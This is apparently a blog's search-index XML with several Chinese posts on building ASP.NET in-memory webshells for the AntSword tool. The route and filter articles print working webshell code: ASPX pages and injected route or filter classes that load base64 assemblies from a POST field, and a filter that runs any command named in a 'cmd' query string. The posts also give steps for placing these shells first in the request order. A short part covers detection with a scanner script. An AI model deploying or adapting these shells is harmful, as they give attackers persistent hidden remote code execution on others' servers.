<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[搞了个公众号]]></title>
    <url>%2Fposts%2Fgzh%2F</url>
    <content type="text"><![CDATA[博客托管在github上，经常打不开，手机端体验也不太好，所以搞了个公众号当移动端版本的博客，欢迎大家关注。有什么问题可以直接公众号留言给我。]]></content>
  </entry>
  <entry>
    <title><![CDATA[聊聊新类型ASPXCSharp]]></title>
    <url>%2Fposts%2F%E8%81%8A%E8%81%8A%E6%96%B0%E7%B1%BB%E5%9E%8BASPXCSharp%2F</url>
    <content type="text"><![CDATA[前言最近花了点时间，给蚁剑加上了C#的shell类型。其实蚁剑在实现jscript加载assembly之后，jscript已经可以实现所有C#可以实现的功能：http://yzddmr6.com/posts/jscript-load-csharp-assembly/这次增加主要是有几点考虑：Jscript的shell出现很容易被杀。我还没有见过用jscript写的项目，web目录下面出现了Jscript文件99.99%就是webshell，特征更明显一些。Jscript的语法属实恶心。没有啥文档，坑全部靠踩。C#类型可以兼容asp.net 各种内存马，Jscript无法做到。本文记录一下自己在开发设计的过程中，遇到的一些问题以及自己的思考。自定义类名其实一开始遇到的问题是无法自定义类名的问题。c#跟java有一点不同的是，java的newInstance是不需要指定type的，只要有Class对象就可以实例化。但是c#在实例化的时候必须要指定实例化的type，这也意味着我们所有的全限定类名必须要一样。冰蝎默认类名都是U，就建在根命名空间下。每个payload是单独编译的。哥斯拉同样采用了这种机制，实例化的类名是LY。但是因为哥斯拉采用的方式是一次性把payload都打到内存里然后反射调用，所以可以把所有的基础payload都编译到一个dll里面。但是这样开发Payload的时候会很难受，因为在同一个项目下面都用一个固定的类名，编译器是会报冲突的。后来想到了一种取巧的办法，用python命令行调用编译程序，在编译之前把类名都统一替换掉。暂时解决了问题，但是还是感觉不够优雅。那么有没有什么办法可以动态获取到assembly的type呢？翻了翻手册，发现以下方法GetType()获取当前实例的 Type。(继承自 Object)GetTypes()获取此程序集中定义的类型。GetName()获取此程序集的 AssemblyName。写代码测试一下1234567String Payload = "xxx";System.Reflection.Assembly a = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));Console.WriteLine("Assembly.GetName: "+a.GetName());Console.WriteLine("Assembly.GetName.Name: "+a.GetName().Name);Console.WriteLine("Assembly.GetType: "+a.GetType());Console.WriteLine("Assembly.GetTypes[0]: "+a.GetTypes()[0]);Console.WriteLine("Assembly.GetTypes[0].FullName: "+a.GetTypes()[0].FullName);output12345Assembly.GetName: BASE_Info, Version=0.0.0.0, Culture=neutral, PublicKeyToken=nullAssembly.GetName.Name: BASE_InfoAssembly.GetType: System.Reflection.AssemblyAssembly.GetTypes[0]: BASE_Info.RunAssembly.GetTypes[0].FullName: BASE_Info.RunAssembly.GetTypes返回的是一个列表，而payload里面我们通常只会定义一个类，所以可以通过Assembly.GetTypes[0]来获取payload类的type。webshell中可以采用如下写法。123456789&lt;%@ Page Language="c#"%&gt;&lt;% String Payload = Request.Form["ant"]; if (Payload != null) &#123; System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)); assembly.CreateInstance(assembly.GetTypes()[0].FullName).Equals(Context); &#125;%&gt;这里又跟java的defineClass不太一样，defineClass只能打进去一个类，而c#的Assembly.Load可以加载一个程序集，并不一定只是一个类。所以为了考虑今后payload里可能会有多个类的情况，推荐的写法如下：123456789&lt;%@ Page Language="c#"%&gt;&lt;% String Payload = Request.Form["ant"]; if (Payload != null) &#123; System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)); assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(Context); &#125;%&gt;即强行指定实例化的类为命名空间下名为Run的类。兼容内存马rebeyond大佬在最开始用加载assembly作为aspx类型的shell时，默认Equals里面是this对象。也就是Page对象。这种方式在aspx文件落地的情况下没有毛病，但是在内存马环境下，是没有Page对象的，这种办法也就不兼容。微软文档如下图哥斯拉则对此进行了兼容处理，不再采用Page对象，而采用了兼容性更好的HttpContext其实入口参数的本质就是获取到当前的request跟response对象。吸取了jsp的经验，一开始parseObj函数内置了三种方法：123456789101112131415161718192021222324public void parseObj(Object obj) &#123; if (obj.GetType().IsArray)//直接数组传入 &#123; Object[] data = (Object[])obj; this.Request = (HttpRequest)data[0]; this.Response = (HttpResponse)data[1]; &#125; else &#123; try &#123; Page page = (Page)obj;//传入Page对象 this.Response = page.Response; this.Request = page.Request; &#125; catch (Exception) &#123; HttpContext context = (HttpContext)obj;//传入HttpContext对象 this.Response = context.Response; this.Request = context.Request; &#125; &#125; &#125;所以在shell中用以下写法均可连接12345678//利用Page对象System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)).CreateInstance(xxx).Equals(this);//利用Context对象System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)).CreateInstance(xxx).Equals(Context);//利用数组System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)).CreateInstance(xxx).Equals(new object[] &#123; Request, Response &#125;);以asp.net的Route内存马为例，从route上下文中获取到的Context是HttpContextBase，而不是HttpContext。具体的实现类为System.Web.HttpContextWrapper。并且通过HttpContextWrapper.Request获取到的对象是HttpRequestBase，默认实现类是System.Web.HttpRequestWrapper。有点类似Tomcat的门面模式。如果要采用数组的方式可以用以下反射代码实现123456789101112FieldInfo requestField = typeof(HttpRequestWrapper).GetField("_httpRequest", BindingFlags.Instance | BindingFlags.NonPublic);HttpRequest httpRequest = (HttpRequest)requestField.GetValue(httpContext.Request);FieldInfo responseField = typeof(HttpResponseWrapper).GetField("_httpResponse", BindingFlags.Instance | BindingFlags.NonPublic);HttpResponse httpResponse = (HttpResponse)responseField.GetValue(httpContext.Response);System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(new object[] &#123; httpRequest, httpResponse &#125;);访问注入内存马的aspx，一片空白说明注入成功蚁剑中输入任意url，连接成功。进一步思考看起来不错了，但是还有继续优化的空间吗？Java中一个比较著名的问题是内存马回显，实际上是如何从当前线程获取当前的request跟response对象。这个问题其实比较蛋疼，因为不同的容器有不同的实现细节，无法统一处理。但是C#则直接把这个接口给暴露了出来，直接可以通过HttpContext.Current获取到当前的context，从而获取当前的request跟response对象。再次改造之后，payload中parseObj如下：123456789101112131415161718192021222324public void parseObj(Object obj) &#123; if (obj.GetType().IsArray) &#123; Object[] data = (Object[])obj; this.Request = (HttpRequest)data[0]; this.Response = (HttpResponse)data[1]; &#125; else &#123; try &#123; HttpContext context = (HttpContext)obj; this.Response = context.Response; this.Request = context.Request; &#125; catch (Exception) &#123; HttpContext context = HttpContext.Current; this.Response = context.Response; this.Request = context.Request; &#125; &#125; &#125;改版后我们去掉了兼容性不强的Page方式，如果数组方式跟Context都无法获取的话，就尝试通过HttpContext.Current来拿到当前的Context。所以其实在shell中直接Equals(null)，或者一个随意对象即可。123456789&lt;%@ Page Language="c#"%&gt;&lt;% String Payload = Request.Form["ant"]; if (Payload != null) &#123; System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)); assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(null); &#125;%&gt;同样可以连接成功至于为什么没有把原来的入口参数方式全部都去掉，是因为新类型并没有在实战环境中测试过。不知道会不会有一些特殊情况。为了谨慎起见，还是保留了原来的入口参数。最后个人喜欢开发一些工具，同时记录下自己的碎碎念。如果能对你有帮助，那就最好不过了。github地址：https://github.com/AntSwordProject/antSword/commit/d2d848c89e03088c20cc31f411e73fe2dd2973ea]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[ASP.NET下的内存马(二)：Route内存马的N种写法]]></title>
    <url>%2Fposts%2FASP-NET%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%9ARoute%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84N%E7%A7%8D%E5%86%99%E6%B3%95%2F</url>
    <content type="text"><![CDATA[本文首发于ASP.NET下的内存马(2) Route内存马 - 跳跳糖 (tttang.com)前言asp.net下的内存马研究文章比较少，目前提到过的包括虚拟路径内存马以及HttpListener内存马。最近研究了一下其他类型的内存马，发现.net可以利用的地方要多得多。所以准备写个系列文章，讲一讲asp.net下的内存马。文章仅作研究性质，不保证任何实战效果，请勿用于非法用途。上篇讲了asp.net mvc下的filter内存马，必须依赖于system.web.mvc.dll这个东西，也就是只能在.net mvc下使用。那么如何仅利用.net framework里面的dll来实现新的内存马呢。这就引出了今天要讲的route内存马。System.Web.RoutingSystem.Web.Routing这个类最早出现在.net 3.5，主要用于在 ASP.NET 应用程序中处理路由。微软文档介绍：12345Route类使你可以指定如何在 ASP.NET 应用程序中处理路由。 你 Route 为要映射到的每个 URL 模式创建一个对象，该对象可以处理与该模式对应的请求。 然后，将路由添加到 Routes 集合。 当应用程序收到请求时，ASP.NET 路由会循环访问集合中的路由， Routes 以查找第一个与 URL 模式匹配的路由。将 Url 属性设置为 URL 模式。 URL 模式由传入 HTTP 请求中的应用程序名称后面的段组成。 例如，在 URL 中 http://www.contoso.com/products/show/beverages ，模式适用于 products/show/beverages 。 具有三个段（如）的模式 &#123;controller&#125;/&#123;action&#125;/&#123;id&#125; 与 URL 匹配 http://www.contoso.com/products/show/beverages 。 每个段均由 / 字符分隔。 当段括在大括号中 (&#123; 和 &#125;) 时，段会被称为 URL 参数。 ASP.NET 路由从请求中检索值并将其分配给 URL 参数。 在上面的示例中，将为 URL 参数 action 分配值 show 。 如果段未括在大括号中，则该值将被视为文本值。将 Defaults 属性设置为一个 RouteValueDictionary 对象，该对象包含在 url 缺少参数时使用的值，或者设置未在 url 中参数化的其他值。 将 Constraints 属性设置为 RouteValueDictionary 包含正则表达式或对象的值的对象 IRouteConstraint 。 这些值用于确定参数值是否有效。如果我们能够动态打进去一个路由，然后映射到我们自定义的类，即可实现内存马的效果。Route内存马那么如何添加呢？我们上一篇文章看到了在mvc中是存在一个GlobalFilters.Filters来存放filter，第二个RouteTable.Routes便是存放全局route的collection。12345678910public class MvcApplication : System.Web.HttpApplication&#123; protected void Application_Start() &#123; AreaRegistration.RegisterAllAreas(); FilterConfig.RegisterGlobalFilters(GlobalFilters.Filters); RouteConfig.RegisterRoutes(RouteTable.Routes); BundleConfig.RegisterBundles(BundleTable.Bundles); &#125;&#125;这里提一嘴为啥不能直接用mvc下面的RouteConfig.RegisterRoutes来注册route点进函数可以看到调用了System.Web.Mvc.RouteCollectionExtensions.MapRoute方法，而这个方法也是要依赖System.Web.Mvc.dll的。所以不能直接拿来用。123456789101112public class RouteConfig&#123; public static void RegisterRoutes(RouteCollection routes) &#123; routes.IgnoreRoute("&#123;resource&#125;.axd/&#123;*pathInfo&#125;"); routes.MapRoute( name: "Default", url: "&#123;controller&#125;/&#123;action&#125;/&#123;id&#125;", defaults: new &#123; controller = "Home", action = "Index", id = UrlParameter.Optional &#125; ); &#125;&#125;一路寻找重载，发现实际上就是给RouteTable.Routes里面增加了一个元素，我们直接调用route.Add即可。System.Web.Routing.RouteCollection.Add第一个参数是名字，不过没有太大用处，只是为了判断map里面有没有重复的。第二个参数是重点，要打进去一个RouteBase类型的item。RouteBase是个抽象类，默认的实现为System.Web.Routing.Route。这里就有不同的操作方式了，第一种是自己实现一个RouteBase，第二种是new一个System.Web.Routing.Route对象。自己实现RouteBase继承RouteBase需要实现两个方法：GetRouteData(HttpContextBase)在派生类中重写时，返回关于请求的路由信息。GetVirtualPath(RequestContext, RouteValueDictionary)在派生类中重写时，检查路由是否与指定的值匹配，如果匹配，则生成 URL，并检索有关该路由的信息。GetRouteData这个点是目前来看最佳的注入点，beichen师傅在kcon的演讲中也是用的这个函数。改写GetRouteData方法，里面加入我们的shell逻辑即可。这里HttpContextBase是个抽象类，具体的实现是HttpContextWrapper，需要用到反射来获取我们需要的request跟response。这里注意一定要加HttpResponse.End()，具体原因大家可以思考一下。1234567891011121314151617181920212223242526272829public class MyRoute : RouteBase &#123; public override RouteData GetRouteData(HttpContextBase httpContext) &#123; String Payload = httpContext.Request.Form["ant"]; if (Payload != null) &#123; FieldInfo requestField = typeof(HttpRequestWrapper).GetField("_httpRequest", BindingFlags.Instance | BindingFlags.NonPublic); HttpRequest httpRequest = (HttpRequest)requestField.GetValue(httpContext.Request); FieldInfo responseField = typeof(HttpResponseWrapper).GetField("_httpResponse", BindingFlags.Instance | BindingFlags.NonPublic); HttpResponse httpResponse = (HttpResponse)responseField.GetValue(httpContext.Response); System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)); assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(new object[] &#123; httpRequest, httpResponse &#125;); httpResponse.End(); &#125; return null; &#125; public override VirtualPathData GetVirtualPath(RequestContext requestContext, RouteValueDictionary values) &#123; return null; &#125; &#125;更简单的一种做法是直接用HttpContext.Current就获取当前的Context对象，传入Equals里即可。1234567891011121314151617181920public class MyRoute : RouteBase &#123; public override RouteData GetRouteData(HttpContextBase httpContext) &#123; HttpContext context = HttpContext.Current; String Payload = httpContext.Request.Form["ant"]; if (Payload != null) &#123; System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)); assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(context); context.Response.End(); &#125; return null; &#125; public override VirtualPathData GetVirtualPath(RequestContext requestContext, RouteValueDictionary values) &#123; return null; &#125; &#125;将我们的逻辑注入到GetRouteData函数中，这是第一种写法。GetVirtualPath其实用GetVirtualPath也是可以注入我们的逻辑的，这是第二种写法。1234567891011121314151617181920public class MyRoute : RouteBase &#123; public override RouteData GetRouteData(HttpContextBase httpContext) &#123; return null; &#125; public override VirtualPathData GetVirtualPath(RequestContext requestContext, RouteValueDictionary values) &#123; HttpContext context = HttpContext.Current; String Payload = context.Request.Form["ant"]; if (Payload != null) &#123; System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)); assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(context); context.Response.End(); &#125; return null; &#125; &#125;优先级那么到底哪个函数会更先被调用呢？我在两个函数，以及Controller里分别加了一条打印的语句。发现顺序是 GetRouteData&gt;Controller&gt;GetVirtualPath，所以还是GetRouteData比较好用。利用System.Web.Routing.Route另一种做法就是沿着现有实现类Route的逻辑来走。他的构造类需要两个参数，第一个是url pattern，第二个是对应的处理handler。实现IRouteHandler接口需要实现GetHttpHandler方法，需要返回一个实现了IHttpHandler的handler这里其实又有不同的操作了，内存马的本质是我们把恶意的代码注入到了一个每次Web请求都会触发的地方。所以我们既可以在RouteHandler中添加恶意逻辑，也可以在实现的HttpHandler里加恶意逻辑。注入RouteHandler123456789101112131415public class MyRoute : IRouteHandler&#123; public IHttpHandler GetHttpHandler(RequestContext requestContext) &#123; HttpContext context = HttpContext.Current; String Payload = context.Request.Form["ant"]; if (Payload != null) &#123; System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)); assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(context); context.Response.End(); &#125; return null; &#125;&#125;报错不影响连接，如果有强迫症可以实现一个空的IHttpHandler。注入HttpHandler主要逻辑在ProcessRequest里，这是第四种写法1234567891011121314151617181920212223242526272829303132333435public class MyRoute : IRouteHandler &#123; public IHttpHandler GetHttpHandler(RequestContext requestContext) &#123; return new Myhandler(requestContext); &#125; &#125; public class Myhandler : IHttpHandler &#123; public RequestContext RequestContext &#123; get; private set; &#125; public Myhandler(RequestContext context) &#123; this.RequestContext = context; &#125; public void ProcessRequest(HttpContext context) &#123; String Payload = context.Request.Form["ant"]; if (Payload != null) &#123; System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)); assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(context); context.Response.End(); &#125; context.Response.End(); &#125; public bool IsReusable &#123; get &#123; return false; &#125; &#125; &#125;路由问题文档：https://docs.microsoft.com/zh-cn/dotnet/api/system.web.routing.route.url?view=netframework-3.5#System_Web_Routing_Route_Url12将值分配给 Url 属性时，在 / 分析 URL 时，字符被解释为分隔符。 使用大括号 (&#123;&#125;) 来定义称为 URL 参数的变量。 将 URL 中的匹配段的值分配给 URL 参数。 Url未括在大括号中的属性中的任何值都将被视为文本常量。?不允许在属性中使用该字符 Url 。 必须通过分隔符或文本常量分隔每个 URL 段。 可以将 &#123;&#123; 或 &#125;&#125; 用作大括号字符的转义符。用这种方式有一个问题，Route的URL默认没有正则，不能像java一样直接指定/*，但是可以用{xxx}来表示任意变量在此为了不影响业务，我们选择一个只有自己知道的开头的字符串1new Route("mr6&#123;page&#125;", new MyRoute())这样任意/mr6xxxxx 都可以连接。添加到第一位跟mvc的filter不同的是，Route的add方法没有order参数的选项，所以依然要考虑如何把我们的shell添加到第一位的问题。RouteCollection本质是个Collection，所以只需要调用Insert方法，并且指定位置为0即可把我们的shell添加到第一位。12RouteCollection routes = RouteTable.Routes;routes.Insert(0, (RouteBase)new MyRoute());至此我们的内存马大业就算完成了。测试访问注入内存马的aspx，一片空白说明注入成功蚁剑中输入任意url，连接成功。检测内存马本人写了个小脚本 ASP.NET-Memshell-Scanner，可用于各类内存马的检测。下载项目中的检测脚本 https://github.com/yzddmr6/ASP.NET-Memshell-Scanner/blob/master/aspx-memshell-scanner.aspx，放到网站目录下，浏览器访问。其中id为1的是使用本文中实现RouteBase的方式注入的内存马，这种情况下Router Type为攻击者自己设置的类名，并且没有RouteHandler。id为2的是使用本文中利用System.Web.Routing.Route注入的内存马，这种情况下Router Type为System.Web.Routing.Route，RouteHandler Type为攻击者自己设置的类名，并且存在URL路径。实锤方法同上文，找到可疑Router的CodeBase文件，使用dnspy等反编译工具打开。找到类名对应的文件，发现恶意代码，即可确认被注入了内存马。参考https://docs.microsoft.com/zh-cn/dotnet/api/system.web.routing.route?view=netframework-3.5https://www.cnblogs.com/liangxiaofeng/p/5619866.htmlhttps://www.programminghunter.com/article/8505151604/https://github.com/knownsec/KCon/blob/master/2021/%E9%AB%98%E7%BA%A7%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%8B%E7%9A%84Webshell.pdfhttps://mp.weixin.qq.com/s/cm8pPAw7dZ-iMb4LvVXAlQ添加到第一位跟mvc的filter不同的是，Route的add方法没有order参数的选项，所以依然要考虑如何把我们的shell添加到第一位的问题。RouteCollection本质是个Collection，所以只需要调用Insert方法，并且指定位置为0即可把我们的shell添加到第一位。12RouteCollection routes = RouteTable.Routes;routes.Insert(0, (RouteBase)new MyRoute());至此我们的内存马大业就算完成了。测试访问注入内存马的aspx，一片空白说明注入成功蚁剑中输入任意url，连接成功。参考https://docs.microsoft.com/zh-cn/dotnet/api/system.web.routing.route?view=netframework-3.5https://www.cnblogs.com/liangxiaofeng/p/5619866.htmlhttps://www.programminghunter.com/article/8505151604/https://github.com/knownsec/KCon/blob/master/2021/%E9%AB%98%E7%BA%A7%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%8B%E7%9A%84Webshell.pdfhttps://docs.microsoft.com/zh-cn/aspnet/mvc/overview/older-versions-1/controllers-and-routing/asp-net-mvc-routing-overview-vb]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[ASP.NET下的内存马(一)：filter内存马]]></title>
    <url>%2Fposts%2FASP-NET%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC-%E4%B8%80-%EF%BC%9Afilter%E5%86%85%E5%AD%98%E9%A9%AC%2F</url>
    <content type="text"><![CDATA[本文首发于ASP.NET下的内存马(1) filter内存马 - 跳跳糖 (tttang.com)前言asp.net下的内存马研究文章比较少，目前提到过的包括虚拟路径内存马以及HttpListener内存马。最近研究了一下其他类型的内存马，发现.net可以利用的地方要多得多。所以准备写个系列文章，讲一讲asp.net下的内存马。文章仅作研究性质，不保证任何实战效果，请勿用于非法用途。ASP.NET MVC结构java下有filter，servlet等拦截器，asp.net mvc也有同样类似的机制。在rider中新建一个asp.net web项目，默认就会起一个asp.net mvc的项目。根目录下有个 Global.asax文件，这个文件会在web应用启动后首先执行。其中Codebehind指向了Global.asax.cs，在Global.asax.cs中可以看到，在asp.net mvc启动的时候，会默认去注册三个组件。12345678910111213namespace WebApplication2&#123; public class MvcApplication : System.Web.HttpApplication &#123; protected void Application_Start() &#123; AreaRegistration.RegisterAllAreas();//注册 MVC 应用程序中的所有区域 FilterConfig.RegisterGlobalFilters(GlobalFilters.Filters);//注册filter RouteConfig.RegisterRoutes(RouteTable.Routes);//注册路由 BundleConfig.RegisterBundles(BundleTable.Bundles);//打包捆绑资源，对css以及js进行压缩 &#125; &#125;&#125;看下FilterConfig.RegisterGlobalFilters这个方法的作用，就是给全局GlobalFilterCollection里面加入我们自定义的filter逻辑。至于为什么不去看route，因为filter的优先级在route之前，当然是我们的第一选择。12345678910namespace WebApplication2&#123; public class FilterConfig &#123; public static void RegisterGlobalFilters(GlobalFilterCollection filters) &#123; filters.Add(new HandleErrorAttribute()); &#125; &#125;&#125;内存马的本质是在容器中注入一段恶意代码，并且由于容器的特性，如filter，servlet等机制，使得每次收到web请求我们的恶意代码都会被执行。在java中添加filter内存马较为麻烦，需要用反射从上下文中获取到filterMap等信息，然后向里面注入我们自定义的filter。但是在asp.net中，则直接将这个接口给用户暴露了出来。这就极大方便了我们注入内存马的操作。看了下System.Web.Mvc.GlobalFilterCollection，从注释就可以看出来，这里存放了全局的filter。filter类型那么应该打入什么类型的filter呢？翻了下文档，ASP.NET MVC 框架支持四种不同类型的筛选器：授权筛选器 = 实现IAuthorizationFilter属性。操作筛选器 = 实现IActionFilter属性。结果筛选器 = 实现IResultFilter属性。异常筛选器 = 实现IExceptionFilter属性。筛选器按上面列出的顺序执行。 例如，授权筛选器始终在操作筛选器和异常筛选器始终在每一种其他类型的筛选器之后执行。授权筛选器用于实现控制器操作的身份验证和授权。 例如，&quot;授权&quot;筛选器是授权筛选器的示例。操作筛选器包含在控制器操作执行之前和之后执行的逻辑。 例如，可以使用操作筛选器修改控制器操作返回的视图数据。结果筛选器包含在执行视图结果之前和之后执行的逻辑。 例如，您可能希望在视图呈现给浏览器之前修改视图结果。异常筛选器是要运行的最后一种筛选器类型。 可以使用异常筛选器来处理控制器操作或控制器操作结果引发的错误。 您还可以使用异常筛选器来记录错误。每种不同类型的筛选器都按特定顺序执行。 如果要控制执行相同类型的筛选器的顺序，则可以设置筛选器的 Order 属性。所有操作筛选器的基类是类System.Web.Mvc.FilterAttribute。 如果要实现特定类型的筛选器，则需要创建从基本筛选器类继承的类，并实现一个或多个IAuthorizationFilter、 IActionFilter、或IResultFilter``IExceptionFilter接口。以上来自微软文档：https://docs.microsoft.com/zh-cn/aspnet/mvc/overview/older-versions-1/controllers-and-routing/understanding-action-filters-cs作为攻击者来说，我们当然希望我们的内存马处于最高优先级的位置。所以就选择继承IAuthorizationFilter接口。除此以外，类比java内存马，还要把我们的filter放到第一位的位置。优先级问题在默认的System.Web.Mvc.GlobalFilterCollection.Add方法中可以看到，Add有两个重载方法，一个带order参数一个不带。最后调用AddInternal方法把我们的filter添加到类成员中。查看System.Web.Mvc.Filter，发现默认的filter order是-1。那么为了提高我们的优先级，我们只需要把order设为一个小于-1的值即可。这里有个小细节：仔细研究的同学会发现，Filter类的构造方法除了order参数还有一个scope参数，那么scope参数是干什么的呢？当有多个 Filter的时候，执行顺序由Order（int 类型）和 Scope（enum 类型，FilterScope）决定。其关键逻辑在FilterComparer中可以看到总结一下就是：Order 和 FilterScope 的数值越小，过滤器的执行优先级越高Order 比 FilterScope 具有更高的优先级，在Order属性值相同时FilterScope才会被考虑测试1234567891011121314151617181920212223242526272829303132&lt;%@ Page Language="c#"%&gt;&lt;%@ Import Namespace="System.Diagnostics" %&gt;&lt;%@ Import Namespace="System.Reflection" %&gt;&lt;%@ Import Namespace="System.Web.Mvc" %&gt;&lt;script runat="server"&gt; public class MyAuthFilter : IAuthorizationFilter &#123; public void OnAuthorization(AuthorizationContext filterContext) &#123; String cmd = filterContext.HttpContext.Request.QueryString["cmd"]; if (cmd != null) &#123; HttpResponseBase response = filterContext.HttpContext.Response; Process p = new Process(); p.StartInfo.FileName = cmd; p.StartInfo.UseShellExecute = false; p.StartInfo.RedirectStandardOutput = true; p.StartInfo.RedirectStandardError = true; p.Start(); byte[] data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd()); response.Write(System.Text.Encoding.Default.GetString(data)); &#125; Console.WriteLine("auth filter inject"); &#125; &#125;&lt;/script&gt;&lt;% GlobalFilterCollection globalFilterCollection = GlobalFilters.Filters; globalFilterCollection.Add(new MyAuthFilter(), -2);%&gt;访问filter.aspx 注入内存马。一片空白表示注入成功访问?cmd=calc弹出计算器蚁剑连接1234567891011121314151617181920212223&lt;%@ Page Language="c#"%&gt;&lt;%@ Import Namespace="System.Web.Mvc" %&gt;&lt;script runat="server"&gt; public class MyAuthFilter : IAuthorizationFilter &#123; public void OnAuthorization(AuthorizationContext filterContext) &#123; HttpContext context = HttpContext.Current; String Payload = filterContext.HttpContext.Request.Params["ant"]; if (Payload != null) &#123; System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)); assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(context); context.Response.End(); &#125; Console.WriteLine("auth filter inject"); &#125; &#125;&lt;/script&gt;&lt;% GlobalFilterCollection globalFilterCollection = GlobalFilters.Filters; globalFilterCollection.Add(new MyAuthFilter(), -2);%&gt;检测内存马本人写了个小脚本 ASP.NET-Memshell-Scanner，可用于各类内存马的检测。下载项目中的检测脚本 https://github.com/yzddmr6/ASP.NET-Memshell-Scanner/blob/master/aspx-memshell-scanner.aspx，放到网站目录下，浏览器访问。根据名称可以看到类型为 ASP.shell_filter2_aspx+MyAuthFilter的filter较为可疑。如果想要实锤怎么操作？根据CodeBase地址找到编译后的aspx文件，用dnspy等反编译工具打开。找到对应的具体类shell_filter2_aspx#MyAuthFilter，可以看到其中内容确实为恶意代码。总结根据本人的研究，aspx必须访问一个真实存在的url时才会触发filter，而非像java一样filter可以用/*直接匹配任意路径。除此之外，java的filter是责任链模式，必须要显式声明chain.doFilter才会走到下一个filter。如果jb小子一时手抖忘了写这句代码，打进内存马后就会造成网站的正常业务无法访问。但是.net没有这种机制。不需要做额外声明即可按顺序调用各个filter。本文提到的filter内存马必须依赖于system.web.mvc.dll这个东西，也就是只能在.net mvc下使用。那么有没有其他的内存马，可以仅依靠.net framework就可以执行呢？等我下篇文章讲一讲。参考文章https://www.cnblogs.com/RobbinHan/archive/2011/11/29/2268076.htmlhttps://docs.microsoft.com/zh-cn/aspnet/mvc/overview/older-versions-1/controllers-and-routing/understanding-action-filters-cshttps://mp.weixin.qq.com/s/cm8pPAw7dZ-iMb4LvVXAlQ]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[As-Exploits v1.4更新]]></title>
    <url>%2Fposts%2FAs-Exploits-v1-4%E6%9B%B4%E6%96%B0%2F</url>
    <content type="text"><![CDATA[更新日志v 1.4 (2021/7/24)aspx新增 内存马 模块aspx新增 内存马管理 模块jsp新增filter内存马jsp内存马管理模块增强，支持filter、servlet（thx: tomcat-memshell-killer项目）新增 执行自定义payload 模块解决html渲染中文乱码JSP内存马模块增强filter内存马新增filter类型内存马。内存马会把自己放到filter的第一位，在遇到shiro框架的时候就不用填写登录Cookie了。默认支持Tomcat以及Spring。内存马管理内存马管理模块核心payload移植了tomcat-memshell-killer的代码，是不是看起来更直观了？还可以贴心的判断有没有其他人的内存马卸载内存马填入Filter name即可ASPX内存马内存马注入aspx内存马的核心代码来源于ysoserial.net的GhostWebShell，三好学生的博客中也有提到：https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8%E8%99%9A%E6%8B%9F%E6%96%87%E4%BB%B6%E9%9A%90%E8%97%8FASP.NET-Webshell主要原理是利用了asp.net下虚拟文件的特性通过ASP.NET的VirtualPathProvider类能够创建虚拟文件，实现以下效果：虚拟文件不存在于服务器的文件系统，但是能够对其动态编译并提供访问服务。ysoserial.net的GhostWebShell.cs提供了一种可供学习的利用思路。可以直接定义要注入的shell内容，默认为普通一句话，当然也可以改成冰蝎哥斯拉之类的连接的时候可以把注入的路径后面加点随机字符串，当作一个文件也可以把注入的路径当作一个目录，在目录下面填写随机文件名要注意的是必须要用.aspx结尾，因为映射的是一个文件，所以要用指定的后缀才能解析。暂时不支持通配符模式内存马管理内存马注入的payload大部分是抄的内存马管理部分的payload主要是自己手搓的。研究一下发现VirtualPathProvider主要用到了类似单向链表的结构，不像Tomcat的内存马有一个Config去定义。获取所有组件需要遍历链表，卸载的时候需要修改当前指针指向来删除节点，梦回数据结构课堂。卸载指定VPP再次获取组件发现内存马已经被删除。剩下的这个System.Web.Hosting.MapPathBasedVirtualPathProvider是IIS默认组件，删除之后网站会崩，请慎重操作。自定义脚本执行这个功能主要是为了方便调试在JSP下需要填写base64格式的编译后的class文件格式按照https://github.com/AntSwordProject/AntSword-JSP-Template项目去编写即可，这里以baseinfo为例：aspxaspx下就直接写jscript代码即可如果想要调用C#的payload看我博客这篇文章：https://yzddmr6.tk/posts/jscript-load-csharp-assembly/php直接写php代码项目地址https://github.com/yzddmr6/As-Exploits]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[一种新型Java一句话木马的实现]]></title>
